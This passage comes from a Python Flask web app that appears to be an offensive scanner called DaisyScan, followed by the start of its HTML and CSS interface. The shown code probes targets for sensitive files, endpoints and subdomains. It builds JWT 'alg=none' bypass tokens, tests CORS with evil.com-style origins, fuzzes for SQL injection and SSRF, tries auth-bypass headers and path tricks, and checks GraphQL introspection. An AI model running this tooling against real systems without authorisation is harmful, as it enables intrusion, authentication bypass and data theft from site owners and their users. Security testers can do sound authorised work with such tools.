                'severity': 'medium', 'status': 401,
                'note': 'Authentication required — endpoint exists',
            })

    with ThreadPoolExecutor(max_workers=20) as ex:
        ex.map(check_path, SENSITIVE_PATHS)

    severity_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4}
    confirmed.sort(key=lambda x: severity_order.get(x['severity'], 9))
    return jsonify({
        'confirmed': confirmed,
        'suspicious': suspicious,
        'forbidden': forbidden,
        'total_checked': len(SENSITIVE_PATHS),
        'baseline_detected': bool(any(s > 200 for s in baseline_sizes)),
    })


@app.route('/api/endpoints', methods=['POST'])
def api_endpoints():
    data = request.json
    url = normalize_url(data.get('url', ''))
    if not url:
        return jsonify({'error': 'URL required'}), 400
    ok, valmsg = validate_domain(url)
    if not ok:
        return jsonify({'error': valmsg}), 400

    baseline_sizes, baseline_snippets = get_404_baseline(url)
    found = []

    def check_ep(path):
        full_url = url + path
        resp = make_request(full_url, timeout=8, allow_redirects=False)
        if not resp:
            return
        if resp.status_code in (404, 410):
            return
        size = len(resp.content)
        text = resp.text[:500] if resp.text else ''
        if resp.status_code == 200 and is_false_positive(text, size, baseline_sizes, baseline_snippets):
            return
        content_type = resp.headers.get('Content-Type', '').split(';')[0].strip()
        is_interesting = resp.status_code in (200, 201, 204) or (resp.status_code in (401, 403) and size > 0)
        found.append({
            'path': path, 'url': full_url,
            'status': resp.status_code, 'size': size,
            'content_type': content_type,
            'interesting': is_interesting,
            'redirect_to': resp.headers.get('Location', '') if resp.status_code in (301, 302, 307, 308) else '',
        })

    with ThreadPoolExecutor(max_workers=25) as ex:
        ex.map(check_ep, COMMON_ENDPOINTS)

    found.sort(key=lambda x: (0 if x['status'] in (200, 201) else 1 if x['status'] in (401, 403) else 2))
    return jsonify({'endpoints': found, 'total_checked': len(COMMON_ENDPOINTS), 'found': len(found)})


@app.route('/api/subdomains', methods=['POST'])
def api_subdomains():
    data = request.json
    url = normalize_url(data.get('url', ''))
    if not url:
        return jsonify({'error': 'URL required'}), 400

    parsed = urlparse(url)
    hostname = parsed.hostname or ''
    base_domain = extract_base_domain(url)
    if not base_domain:
        return jsonify({'error': 'Cannot extract base domain'}), 400

    try:
        socket.gethostbyname(hostname)
    except socket.gaierror:
        return jsonify({'error': f'Base domain {base_domain} does not resolve — cannot scan subdomains'}), 400

    alive = []

    def check_sub(sub):
        result = check_subdomain_alive(sub, base_domain)
        if result:
            if result['title']:
                result['title'] = result['title'].group(1).strip()[:80]
            else:
                result['title'] = ''
            alive.append(result)

    with ThreadPoolExecutor(max_workers=30) as ex:
        ex.map(check_sub, COMMON_SUBDOMAINS)

    alive.sort(key=lambda x: (0 if x['status'] == 200 else 1, x['subdomain']))
    return jsonify({
        'base_domain': base_domain,
        'total_checked': len(COMMON_SUBDOMAINS),
        'alive': alive,
        'count': len(alive),
    })


@app.route('/api/jwt', methods=['POST'])
def api_jwt():
    data = request.json
    token = (data.get('token') or '').strip()
    if not token:
        return jsonify({'error': 'JWT token required'}), 400

    parts = token.split('.')
    if len(parts) != 3:
        return jsonify({'error': 'Invalid JWT — expected 3 dot-separated parts'}), 400

    def decode_part(part):
        pad = 4 - len(part) % 4
        if pad != 4:
            part += '=' * pad
        try:
            return json.loads(base64.urlsafe_b64decode(part).decode('utf-8'))
        except Exception:
            return None

    header = decode_part(parts[0])
    payload = decode_part(parts[1])
    issues = []

    if header:
        alg = (header.get('alg') or '').upper()
        if alg in ('NONE', ''):
            issues.append({'severity': 'CRITICAL', 'issue': 'Algorithm is "none" — no signature verification performed'})
        elif alg in ('HS256', 'HS384', 'HS512'):
            issues.append({'severity': 'HIGH', 'issue': f'{alg} symmetric HMAC — secret key may be brute-forced'})
        else:
            issues.append({'severity': 'INFO', 'issue': f'{alg} asymmetric algorithm detected'})

        if 'kid' in header:
            issues.append({'severity': 'MEDIUM', 'issue': f'kid parameter present: "{header["kid"]}" — test SQL injection and path traversal in kid'})
        if 'jku' in header:
            issues.append({'severity': 'HIGH', 'issue': f'jku (JWK Set URL) present: {header["jku"]} — remote key injection may be possible'})
        if 'x5u' in header:
            issues.append({'severity': 'HIGH', 'issue': f'x5u present: {header["x5u"]} — remote certificate injection possible'})
        if 'jwk' in header:
            issues.append({'severity': 'HIGH', 'issue': 'Embedded JWK in header — embedded key confusion attack possible'})

    if payload:
        now = time.time()
        exp = payload.get('exp')
        iat = payload.get('iat')
        nbf = payload.get('nbf')

        if not exp:
            issues.append({'severity': 'HIGH', 'issue': 'No expiration (exp) claim — token never expires'})
        else:
            import datetime
            exp_dt = datetime.datetime.utcfromtimestamp(exp).strftime('%Y-%m-%d %H:%M:%S')
            if exp < now:
                issues.append({'severity': 'INFO', 'issue': f'Token is EXPIRED — expired at {exp_dt} UTC'})
            else:
                ttl = int(exp - now)
                issues.append({'severity': 'INFO', 'issue': f'Token valid until {exp_dt} UTC (TTL: {ttl}s)'})

        if not iat:
            issues.append({'severity': 'LOW', 'issue': 'No issued-at (iat) claim'})
        if nbf and nbf > now:
            issues.append({'severity': 'INFO', 'issue': f'Token not-before (nbf) is in the future'})

        sensitive = ['password','passwd','secret','key','token','api_key','credit_card','ssn','private','pwd','credential','access_token','refresh_token','authorization']
        for k in payload:
            if any(s in k.lower() for s in sensitive):
                issues.append({'severity': 'HIGH', 'issue': f'Sensitive claim: "{k}" = "{str(payload[k])[:60]}"'})

        for role_key in ['role','roles','permissions','scope','groups','authorities']:
            val = payload.get(role_key)
            if val:
                issues.append({'severity': 'INFO', 'issue': f'{role_key} claim: {str(val)[:80]}'})

    none_hdr = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
    none_token = f'{none_hdr}.{parts[1]}.'

    alg_confusion = ''
    if header and header.get('alg', '').startswith('RS'):
        alg_confusion = 'RS→HS confusion: try signing with HS256 using the server\'s RSA public key as secret'

    return jsonify({
        'header': header, 'payload': payload,
        'signature': parts[2][:32] + '...',
        'issues': issues,
        'attacks': {
            'none_bypass': none_token,
            'alg_confusion': alg_confusion,
            'description': 'Set alg=none and remove signature to bypass verification on vulnerable servers',
        }
    })


@app.route('/api/cors', methods=['POST'])
def api_cors():
    data = request.json
    url = normalize_url(data.get('url', ''))
    if not url:
        return jsonify({'error': 'URL required'}), 400
    ok, valmsg = validate_domain(url)
    if not ok:
        return jsonify({'error': valmsg}), 400

    parsed = urlparse(url)
    host = parsed.hostname or 'target.com'

    test_origins = [
        'https://evil.com',
        'https://attacker.com',
        'null',
        f'https://evil.{host}',
        f'https://{host}.evil.com',
        f'https://evil{host.replace(".", "")}com.attacker.com',
        f'https://not{host}',
        'http://localhost',
        'http://127.0.0.1',
        'https://notevil.com',
    ]

    results = []
    for origin in test_origins:
        resp = make_request(url, headers={'Origin': origin}, timeout=8)
        if not resp:
            continue
        acao = resp.headers.get('Access-Control-Allow-Origin', '')
        acac = resp.headers.get('Access-Control-Allow-Credentials', 'false')
        acam = resp.headers.get('Access-Control-Allow-Methods', '')
        acah = resp.headers.get('Access-Control-Allow-Headers', '')

        vuln = False
        severity = 'INFO'
        issue = ''
        exploitable = False

        if acao == '*':
            if acac.lower() == 'true':
                vuln = True
                severity = 'HIGH'
                issue = 'Wildcard ACAO with credentials=true (browsers block this, but may affect non-browser clients)'
            else:
                vuln = True
                severity = 'MEDIUM'
                issue = 'Wildcard ACAO — any origin can read unauthenticated responses'

        elif acao == origin and origin != 'null':
            has_body = len(resp.content) > 100
            is_json = 'application/json' in resp.headers.get('Content-Type', '')
            if acac.lower() == 'true':
                vuln = True
                severity = 'CRITICAL'
                issue = 'Origin reflected + credentials=true — cross-origin authenticated data theft possible'
                exploitable = has_body and (is_json or resp.status_code == 200)
            else:
                vuln = True
                severity = 'HIGH'
                issue = 'Origin reflected — unauthenticated CORS misconfiguration'

        elif acao == 'null':
            vuln = True
            severity = 'HIGH'
            issue = 'ACAO: null — exploitable via sandboxed iframe technique'

        if not acao:
            vuln = False
            severity = 'INFO'
            issue = 'CORS not configured for this origin'

        results.append({
            'origin_tested': origin,
            'ACAO': acao or 'Not set',
            'ACAC': acac,
            'ACAM': acam or 'Not set',
            'ACAH': acah or 'Not set',
            'vulnerable': vuln,
            'severity': severity,
            'issue': issue,
            'exploitable': exploitable,
            'response_has_data': len(resp.content) > 100,
        })

    preflight = {}
    opts = make_request(url, method='OPTIONS', headers={
        'Origin': 'https://evil.com',
        'Access-Control-Request-Method': 'POST',
        'Access-Control-Request-Headers': 'Content-Type, Authorization',
    }, timeout=8)
    if opts:
        preflight = {
            'status': opts.status_code,
            'ACAO': opts.headers.get('Access-Control-Allow-Origin', 'Not set'),
            'ACAM': opts.headers.get('Access-Control-Allow-Methods', 'Not set'),
            'ACAH': opts.headers.get('Access-Control-Allow-Headers', 'Not set'),
            'ACAC': opts.headers.get('Access-Control-Allow-Credentials', 'Not set'),
            'ACMAGE': opts.headers.get('Access-Control-Max-Age', 'Not set'),
        }

    return jsonify({'results': results, 'preflight': preflight})


@app.route('/api/fuzzer', methods=['POST'])
def api_fuzzer():
    data = request.json
    url = normalize_url(data.get('url', ''))
    fuzz_type = data.get('type', 'sqli')
    param = data.get('param', 'id')
    ssrf_param = data.get('ssrf_param', 'url')

    if not url:
        return jsonify({'error': 'URL required'}), 400
    ok, valmsg = validate_domain(url)
    if not ok:
        return jsonify({'error': valmsg}), 400

    results = []

    if fuzz_type == 'sqli':
        bl_resp = make_request(url, params={param: '1'}, timeout=10)
        baseline_len = len(bl_resp.content) if bl_resp else 0
        baseline_time = bl_resp.elapsed.total_seconds() if bl_resp else 0.5

        bl_false = make_request(url, params={param: '2'}, timeout=10)
        baseline_false_len = len(bl_false.content) if bl_false else baseline_len

        def test_sqli(entry):
            payload, ptype = entry
            start = time.time()
            resp = make_request(url, params={param: payload}, timeout=16)
            elapsed = time.time() - start
            if not resp:
                return
            indicators = []
            body = (resp.text or '').lower()

            for pat in SQLI_ERROR_PATTERNS:
                if re.search(pat, body):
                    indicators.append(f'SQL error pattern: "{pat}"')
                    break

            if 'time' in ptype and elapsed > baseline_time + 3.5 and baseline_time < 1.5:
                indicators.append(f'Time-based: {elapsed:.2f}s response (baseline: {baseline_time:.2f}s) — delay confirmed')

            if 'boolean' in ptype or 'true' in ptype or 'false' in ptype:
                if ptype.endswith('_true') and abs(len(resp.content) - baseline_len) < 50:
                    pass
                elif ptype.endswith('_false') and abs(len(resp.content) - baseline_false_len) < 50:
                    pass
                elif ptype.endswith('_true') and abs(len(resp.content) - baseline_false_len) > 200:
                    indicators.append(f'Boolean: true-payload response ({len(resp.content)}B) differs from false-payload ({baseline_false_len}B)')

            if len(indicators) >= 1:
                results.append({
                    'payload': payload, 'type': ptype,
                    'status': resp.status_code,
                    'size': len(resp.content),
                    'time': round(elapsed, 3),
                    'indicators': indicators,
                    'confirmed': len(indicators) >= 1 and any('error' in i.lower() or 'time-based' in i.lower() for i in indicators),
                })

        with ThreadPoolExecutor(max_workers=4) as ex:
            ex.map(test_sqli, SQLI_PAYLOADS)

    elif fuzz_type == 'ssrf':
        def test_ssrf(entry):
            payload, label = entry
            resp = make_request(url, params={ssrf_param: payload}, timeout=10)
            if not resp:
                return
            body = (resp.text or '').lower()[:3000]
            indicators = []
            for pat in SSRF_CONFIRM_PATTERNS:
                if re.search(pat, body):
                    indicators.append(f'Confirmed pattern: {pat}')

            if indicators:
                results.append({
                    'payload': payload, 'label': label,
                    'status': resp.status_code, 'size': len(resp.content),
                    'indicators': indicators,
                    'confirmed': True,
                    'snippet': resp.text[:200],
                })
            elif resp.status_code == 200 and len(resp.content) > 100 and 'file://' in payload:
                body_text = resp.text or ''
                if re.search(r'(root:|bin:|usr:|etc:|proc:)', body_text):
                    results.append({
                        'payload': payload, 'label': label,
                        'status': resp.status_code, 'size': len(resp.content),
                        'indicators': ['File content pattern detected'],
                        'confirmed': True,
                        'snippet': body_text[:200],
                    })

        with ThreadPoolExecutor(max_workers=4) as ex:
            ex.map(test_ssrf, SSRF_PAYLOADS)

    elif fuzz_type == 'auth_bypass':
        base_resp = make_request(url, timeout=8)
        base_status = base_resp.status_code if base_resp else 0
        base_size = len(base_resp.content) if base_resp else 0

        for hdr_name, hdr_val in AUTH_BYPASS_HEADERS.items():
            resp = make_request(url, headers={hdr_name: hdr_val}, timeout=8)
            if not resp:
                continue
            bypass = (
                resp.status_code == 200 and base_status in (401, 403)
            ) or (
                resp.status_code != base_status and resp.status_code == 200
            )
            results.append({
                'technique': f'{hdr_name}: {hdr_val}',
                'status': resp.status_code, 'baseline_status': base_status,
                'size': len(resp.content), 'size_change': len(resp.content) - base_size,
                'bypass_detected': bypass,
            })

        path_tricks = [
            (url + '//',                  'Double slash'),
            (url + '/./',                 'Dot-slash'),
            (url.rstrip('/') + '/%2f',    'URL-encoded slash'),
            (url.rstrip('/') + '/..;/',   'Spring semicolon bypass'),
            (url.rstrip('/') + '/%20',    'URL-encoded space'),
            (url.rstrip('/') + '/.json',  'Extension override'),
            (url.rstrip('/') + '?isAdmin=true', 'Admin param injection'),
            (url.rstrip('/') + '?role=admin',   'Role param injection'),
            (url.rstrip('/') + '?debug=true',   'Debug param injection'),
            (url.rstrip('/') + '#admin',         'Fragment bypass'),
        ]
        for pt_url, technique in path_tricks:
            resp = make_request(pt_url, timeout=8)
            if not resp:
                continue
            bypass = resp.status_code == 200 and base_status in (401, 403)
            results.append({
                'technique': technique,
                'url': pt_url,
                'status': resp.status_code,
                'baseline_status': base_status,
                'size': len(resp.content),
                'size_change': len(resp.content) - base_size,
                'bypass_detected': bypass,
            })

    return jsonify({'results': results, 'type': fuzz_type})


@app.route('/api/graphql', methods=['POST'])
def api_graphql():
    data = request.json
    url = normalize_url(data.get('url', ''))
    if not url:
        return jsonify({'error': 'URL required'}), 400
    ok, valmsg = validate_domain(url)
    if not ok:
        return jsonify({'error': valmsg}), 400

    parsed = urlparse(url)
    base = f'{parsed.scheme}://{parsed.netloc}'
    results = {'endpoints_found': [], 'introspection': None, 'schema_types': [], 'vulnerabilities': [], 'mutations': []}

    gql_paths = ['/graphql','/api/graphql','/graphiql','/query','/api/query','/v1/graphql','/api/v1/graphql','/graph','/gql']
    for ep in gql_paths:
        turl = base + ep
        r = make_request(turl, method='POST', headers={'Content-Type': 'application/json'},
                         data=json.dumps({'query': '{__typename}'}), timeout=8)
        if r and r.status_code not in (404, 405, 502, 503):
            try:
                rd = r.json()
                is_gql = 'data' in rd or 'errors' in rd
            except Exception:
                is_gql = False
            results['endpoints_found'].append({'url': turl, 'status': r.status_code, 'is_graphql': is_gql})

    intro_q = {'query': '''{ __schema { queryType{name} mutationType{name} subscriptionType{name} types { name kind description fields(includeDeprecated:true){ name description args{name type{name kind ofType{name kind}}} type{name kind ofType{name kind ofType{name kind}}} } } } }'''}
    r = make_request(url, method='POST', headers={'Content-Type': 'application/json'},
                     data=json.dumps(intro_q), timeout=14)
    if r and r.status_code == 200:
        try:
            rd = r.json()
            if rd.get('data') and '__schema' in rd['data']:
                schema = rd['data']['__schema']
                types = [t['name'] for t in schema.get('types', []) if not t['name'].startswith('__')]
                results['introspection'] = 'ENABLED'
                results['schema_types'] = types[:40]
                results['vulnerabilities'].append({'severity': 'HIGH', 'issue': f'Introspection enabled — {len(types)} types exposed including schema structure'})

                mutation_type = schema.get('mutationType')
                if mutation_type:
                    results['vulnerabilities'].append({'severity': 'MEDIUM', 'issue': f'Mutations available (type: {mutation_type.get("name", "Mutation")})'})

                user_types = [t for t in schema.get('types', []) if not t['name'].startswith('__') and t.get('fields')]
                for ut in user_types[:5]:
                    sensitive_fields = [f['name'] for f in (ut.get('fields') or []) if any(s in f['name'].lower() for s in ['password','secret','token','key','hash','credential','ssn','credit','private'])]
                    if sensitive_fields:
                        results['vulnerabilities'].append({'severity': 'HIGH', 'issue': f'Sensitive fields in type "{ut["name"]}": {", ".join(sensitive_fields)}'})
            else:
                results['introspection'] = 'Disabled or error'
        except Exception:
            results['introspection'] = 'Invalid response'
    elif r:
        results['introspection'] = f'HTTP {r.status_code}'

    depth_r = make_request(url, method='POST', headers={'Content-Type': 'application/json'},
                           data=json.dumps({'query': '{a{a{a{a{a{a{a{a{a{a{__typename}}}}}}}}}}}'}), timeout=10)
    if depth_r and depth_r.status_code == 200:
        results['vulnerabilities'].append({'severity': 'MEDIUM', 'issue': 'No query depth limiting — vulnerable to DoS via deeply nested queries'})

    batch_r = make_request(url, method='POST', headers={'Content-Type': 'application/json'},
                           data=json.dumps([{'query': '{__typename}'}, {'query': '{__typename}'}]), timeout=8)
    if batch_r and batch_r.status_code == 200:
        try:
            if isinstance(batch_r.json(), list):
                results['vulnerabilities'].append({'severity': 'LOW', 'issue': 'Batch query execution enabled — potential for batch brute-force/DoS'})
        except Exception:
            pass

    alias_r = make_request(url, method='POST', headers={'Content-Type': 'application/json'},
                           data=json.dumps({'query': '{' + ' '.join(f'a{i}:__typename' for i in range(50)) + '}'}), timeout=10)
    if alias_r and alias_r.status_code == 200:
        results['vulnerabilities'].append({'severity': 'LOW', 'issue': 'No alias limit — field alias flooding possible'})

    return jsonify(results)


HTML_TEMPLATE = r'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0">
<title>DaisyScan v2 — WebShredder</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{
  --bg:#05050e;--bg2:#0b0b18;--bg3:#10101e;--bg4:#15152a;
  --p:#8b5cf6;--pl:#c4b5fd;--pd:#6d28d9;--pg:rgba(139,92,246,.2);--pb:rgba(139,92,246,.08);
  --tx:#ede9fe;--td:#9d8cbe;--ts:#6b5c8a;
  --gr:#34d399;--rd:#f87171;--yw:#fbbf24;--or:#fb923c;--cy:#22d3ee;
  --bdr:rgba(139,92,246,.15);--bdr2:rgba(139,92,246,.28);
  --fd:'Syne',sans-serif;--fm:'JetBrains Mono',monospace;
}
html{scroll-behavior:smooth}
body{background:var(--bg);color:var(--tx);font-family:var(--fm);min-height:100vh;overflow-x:hidden;line-height:1.6}
body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(139,92,246,.018) 1px,transparent 1px),linear-gradient(90deg,rgba(139,92,246,.018) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0}
body::after{content:'';position:fixed;top:-300px;right:-300px;width:700px;height:700px;background:radial-gradient(circle,rgba(139,92,246,.045) 0%,transparent 65%);pointer-events:none;z-index:0}

header{position:relative;z-index:100;display:flex;align-items:center;justify-content:space-between;padding:12px 20px;border-bottom:1px solid var(--bdr);background:rgba(5,5,14,.97);backdrop-filter:blur(20px);flex-wrap:wrap;gap:10px}
.logo-area{display:flex;align-items:center;gap:11px}
.daisy-logo{width:42px;height:42px;animation:spin 24s linear infinite;filter:drop-shadow(0 0 10px rgba(196,181,253,.5));flex-shrink:0}
@keyframes spin{to{transform:rotate(360deg)}}
.logo-name{font-family:var(--fd);font-size:1.3rem;font-weight:800;color:var(--pl);letter-spacing:.03em;line-height:1;text-shadow:0 0 24px rgba(196,181,253,.3)}
.logo-sub{font-size:.58rem;color:var(--td);letter-spacing:.17em;text-transform:uppercase;margin-top:2px}
.header-right{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
.lang-sw{display:flex;gap:2px;background:var(--bg2);border:1px solid var(--bdr);border-radius:6px;padding:3px}
.lang-btn{background:none;border:none;color:var(--td);font-family:var(--fm);font-size:.65rem;font-weight:600;letter-spacing:.1em;padding:3px 8px;border-radius:4px;cursor:pointer;transition:all .18s}
.lang-btn.active,.lang-btn:hover{background:var(--pd);color:var(--pl)}
.socials{display:flex;gap:6px}
.soc-link{display:flex;align-items:center;gap:4px;padding:5px 10px;border:1px solid var(--bdr);border-radius:6px;background:var(--bg2);color:var(--td);text-decoration:none;font-size:.65rem;letter-spacing:.07em;transition:all .22s;white-space:nowrap}
.soc-link:hover{border-color:var(--p);color:var(--pl);box-shadow:0 0 12px var(--pg)}
.soc-link svg{width:12px;height:12px;flex-shrink:0}

main{position:relative;z-index:5;max-width:1200px;margin:0 auto;padding:20px 16px}

.hero{display:flex;align-items:center;justify-content:space-between;padding:28px 0 20px;margin-bottom:28px;flex-wrap:wrap;gap:20px}
.hero-text{flex:1;min-width:200px}
.hero-title{font-family:var(--fd);font-size:clamp(1.7rem,5vw,3rem);font-weight:800;color:var(--pl);letter-spacing:-.02em;line-height:1.05;text-shadow:0 0 44px rgba(196,181,253,.22)}
.hero-sub{margin-top:8px;font-size:.7rem;color:var(--td);letter-spacing:.14em;text-transform:uppercase}
.hero-animate{display:flex;align-items:flex-end;gap:14px;flex-shrink:0}

.cat-wrap{position:relative;width:120px;height:150px;filter:drop-shadow(0 8px 24px rgba(139,92,246,.25))}
.cat-body{animation:catBreathe 4s ease-in-out infinite}
@keyframes catBreathe{0%,100%{transform:translateY(0)}50%{transform:translateY(-3px)}}
.cat-tail-path{transform-origin:68px 118px;animation:tailWag 2.8s ease-in-out infinite}
@keyframes tailWag{0%,100%{transform:rotate(-5deg)}50%{transform:rotate(10deg)}}
.eye-l,.eye-r{animation:catBlink 5.5s infinite ease-in-out}
.eye-r{animation-delay:.06s}
@keyframes catBlink{0%,88%,100%{transform:scaleY(1)}92%,96%{transform:scaleY(0.06)}}
.eye-l{transform-origin:38px 67px}
.eye-r{transform-origin:63px 67px}

.cat-daisy-wrap{display:flex;flex-direction:column;align-items:center;gap:6px}
.mini-daisy{animation:daisyFloat 3.2s ease-in-out infinite}
@keyframes daisyFloat{0%,100%{transform:rotate(-5deg) translateY(0)}50%{transform:rotate(5deg) translateY(-4px)}}

.tabs-outer{overflow-x:auto;scrollbar-width:none;margin-bottom:18px}
.tabs-outer::-webkit-scrollbar{display:none}
.tabs{display:flex;gap:2px;padding:4px;background:var(--bg2);border:1px solid var(--bdr);border-radius:10px;min-width:max-content}
.tab-btn{background:none;border:none;color:var(--td);font-family:var(--fm);font-size:.68rem;font-weight:500;letter-spacing:.06em;padding:7px 14px;border-radius:7px;cursor:pointer;transition:all .18s;white-space:nowrap;display:flex;align-items:center;gap:5px}
.tab-btn:hover{color:var(--pl);background:rgba(139,92,246,.1)}
.tab-btn.active{background:linear-gradient(135deg,var(--pd),var(--p));color:#fff;box-shadow:0 0 16px var(--pg)}
.tab-panel{display:none;animation:panelIn .28s ease}
.tab-panel.active{display:block}
@keyframes panelIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}

.card{background:var(--bg2);border:1px solid var(--bdr);border-radius:12px;padding:18px;margin-bottom:16px;transition:border-color .28s}
.card:hover{border-color:var(--bdr2)}
.card-title{font-family:var(--fd);font-size:.82rem;font-weight:700;color:var(--pl);letter-spacing:.06em;text-transform:uppercase;margin-bottom:14px;display:flex;align-items:center;gap:6px}

.form-row{display:grid;gap:12px;grid-template-columns:1fr}
.form-row-2{display:grid;gap:12px;grid-template-columns:1fr 1fr}
.form-row-3{display:grid;gap:12px;grid-template-columns:1fr 1fr 1fr}
@media(max-width:640px){.form-row-2,.form-row-3{grid-template-columns:1fr}}

.inp-grp{display:flex;flex-direction:column;gap:5px}
.inp-label{font-size:.63rem;color:var(--td);letter-spacing:.13em;text-transform:uppercase}
input[type=text],input[type=url],textarea,select{width:100%;background:var(--bg3);border:1px solid var(--bdr);border-radius:7px;color:var(--tx);font-family:var(--fm);font-size:.76rem;padding:8px 12px;outline:none;transition:border-color .18s,box-shadow .18s;-webkit-appearance:none}
input:focus,textarea:focus,select:focus{border-color:var(--p);box-shadow:0 0 0 2px var(--pg)}
textarea{min-height:72px;resize:vertical}
select{cursor:pointer;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%239d8cbe' d='M6 8L1 3h10z'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 10px center;padding-right:28px}
select option{background:var(--bg3)}

.btn{display:inline-flex;align-items:center;gap:6px;background:linear-gradient(135deg,var(--pd),var(--p));border:none;border-radius:7px;color:#fff;font-family:var(--fm);font-size:.72rem;font-weight:600;letter-spacing:.1em;padding:8px 16px;cursor:pointer;transition:all .22s;text-transform:uppercase;text-decoration:none;white-space:nowrap}
.btn:hover:not(:disabled){transform:translateY(-1px);box-shadow:0 4px 20px var(--pg)}
.btn:active{transform:none}
.btn:disabled{opacity:.45;cursor:not-allowed;transform:none}
.btn-sm{padding:4px 10px;font-size:.64rem}
.btn-sec{background:var(--bg3);border:1px solid var(--bdr);color:var(--pl)}
.btn-sec:hover:not(:disabled){background:var(--pb)}

.spin{display:none;width:13px;height:13px;border:2px solid rgba(196,181,253,.2);border-top-color:var(--pl);border-radius:50%;animation:sp .65s linear infinite;flex-shrink:0}
@keyframes sp{to{transform:rotate(360deg)}}

.scan-bar{height:3px;background:var(--bg3);border-radius:2px;overflow:hidden;margin-top:10px;display:none}
.scan-bar.show{display:block}
.scan-bar-fill{height:100%;background:linear-gradient(90deg,var(--pd),var(--p),var(--cy));background-size:200%;animation:scanFill 1.8s linear infinite}
@keyframes scanFill{0%{background-position:100%}100%{background-position:-100%}}

.status-line{display:flex;align-items:center;gap:7px;font-size:.7rem;min-height:18px;margin-top:8px}
.st-run{color:var(--pl)} .st-ok{color:var(--gr)} .st-err{color:var(--rd)}

.res-box{background:var(--bg3);border:1px solid var(--bdr);border-radius:8px;padding:12px;margin-top:12px;max-height:500px;overflow-y:auto;font-size:.74rem;line-height:1.75}
.res-box::-webkit-scrollbar{width:3px}
.res-box::-webkit-scrollbar-thumb{background:var(--pd);border-radius:3px}

.badge{display:inline-flex;align-items:center;padding:2px 7px;border-radius:4px;font-size:.6rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;flex-shrink:0}
.b-crit{background:rgba(248,113,113,.12);color:#f87171;border:1px solid rgba(248,113,113,.25)}
.b-high{background:rgba(251,146,60,.12);color:#fb923c;border:1px solid rgba(251,146,60,.25)}
.b-med{background:rgba(251,191,36,.12);color:#fbbf24;border:1px solid rgba(251,191,36,.25)}
.b-low{background:rgba(139,92,246,.12);color:#c4b5fd;border:1px solid rgba(139,92,246,.25)}
.b-info{background:rgba(34,211,238,.08);color:#22d3ee;border:1px solid rgba(34,211,238,.2)}
.b-ok{background:rgba(52,211,153,.08);color:#34d399;border:1px solid rgba(52,211,153,.2)}
.b-warn{background:rgba(251,146,60,.12);color:#fb923c;border:1px solid rgba(251,146,60,.25)}

.s200{color:var(--gr)}.s30x{color:var(--yw)}.s40x{color:var(--or)}.s50x{color:var(--rd)}
.c-vuln{color:var(--rd);font-weight:600}.c-ok{color:var(--gr)}.c-warn{color:var(--yw)}.c-info{color:var(--td);font-style:italic}.c-hl{color:var(--pl)}

.ri{display:flex;align-items:flex-start;gap:8px;padding:6px 0;border-bottom:1px solid rgba(139,92,246,.06)}
.ri:last-child{border-bottom:none}
.rk{color:var(--td);min-width:150px;flex-shrink:0;font-size:.71rem}
.rv{color:var(--pl);word-break:break-all;font-size:.74rem}
@media(max-width:480px){.rk{min-width:100px;font-size:.68rem}}

.file-entry{padding:10px 0;border-bottom:1px solid rgba(139,92,246,.07)}
.file-entry:last-child{border-bottom:none}
.file-meta{display:flex;align-items:center;gap:7px;flex-wrap:wrap;margin-bottom:4px}
.file-url{font-size:.68rem;color:var(--td);word-break:break-all;margin-bottom:4px}
.file-url a{color:var(--cy);text-decoration:none}
.file-url a:hover{text-decoration:underline}
.file-snip{font-size:.67rem;color:var(--ts);background:var(--bg);padding:6px 8px;border-radius:4px;border:1px solid var(--bdr);word-break:break-all;max-height:56px;overflow:hidden;margin-top:4px}

.ep-entry{display:flex;align-items:center;gap:8px;padding:6px 0;border-bottom:1px solid rgba(139,92,246,.06);flex-wrap:wrap}
.ep-entry:last-child{border-bottom:none}
.ep-path{color:var(--pl);font-size:.74rem;word-break:break-all;flex:1}
.ep-meta{display:flex;align-items:center;gap:6px;flex-wrap:wrap}

.sub-entry{display:flex;align-items:center;gap:8px;padding:8px 0;border-bottom:1px solid rgba(139,92,246,.06);flex-wrap:wrap}
.sub-entry:last-child{border-bottom:none}
.sub-host{font-family:var(--fd);font-size:.78rem;color:var(--pl);font-weight:600;word-break:break-all}
.sub-meta{display:flex;gap:6px;flex-wrap:wrap;align-items:center;font-size:.68rem;color:var(--td)}

.tag-v{color:var(--rd);font-weight:600}.tag-ok{color:var(--gr)}.tag-w{color:var(--yw)}.tag-i{color:var(--td);font-style:italic}

pre.jd{background:var(--bg);border:1px solid var(--bdr);border-radius:6px;padding:10px;overflow-x:auto;font-size:.69rem;line-height:1.65;color:var(--pl);margin-top:6px;white-space:pre-wrap;word-break:break-word}

.about-grid{display:grid;grid-template-columns:auto 1fr;gap:22px;align-items:start}
@media(max-width:500px){.about-grid{grid-template-columns:1fr;text-align:center}}
.avatar-box{width:90px;height:90px;border-radius:50%;background:linear-gradient(135deg,var(--pd),var(--p));display:flex;align-items:center;justify-content:center;font-size:2.2rem;border:2px solid var(--p);box-shadow:0 0 24px var(--pg)}
.about-name{font-family:var(--fd);font-size:1.15rem;font-weight:800;color:var(--pl)}
.about-role{font-size:.63rem;color:var(--td);letter-spacing:.14em;text-transform:uppercase;margin:3px 0 10px}
.about-bio{font-size:.76rem;color:var(--tx);line-height:1.88;margin-bottom:12px}
.skill-tags{display:flex;flex-wrap:wrap;gap:4px;margin-bottom:12px}
.stag{background:var(--pb);border:1px solid var(--bdr);color:var(--pl);padding:2px 8px;border-radius:4px;font-size:.63rem;letter-spacing:.06em}
.social-btns{display:flex;gap:8px;flex-wrap:wrap}

